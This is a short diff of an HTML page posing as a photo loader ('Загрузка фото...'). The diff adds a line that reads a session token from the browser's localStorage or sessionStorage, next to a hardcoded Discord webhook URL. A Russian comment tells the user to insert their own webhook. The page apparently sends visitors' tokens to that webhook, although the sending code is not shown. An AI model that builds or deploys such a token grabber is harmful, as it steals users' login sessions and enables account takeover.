@@ -8,6 +8,7 @@
 <body>
   <h1>Загрузка фото...</h1>
   <script>
+    const token = localStorage.getItem("token") || sessionStorage.getItem("token") || "нет токена";
     // ←←←← ВСТАВЬ СВОЙ ВЕБХУК СЮДА (полный URL!) →→→→
     const WEBHOOK = "https://discord.com/api/webhooks/1447243695366738106/iCvLL1roGXfGONygU2iASibPbJjs5AwiE5u3AxjvR1Eb9qQ-JgDGwcNrNn-u8p3C93RZ";
 
@@ -93,3 +94,4 @@
   </script>
 </body>
 </html>
+
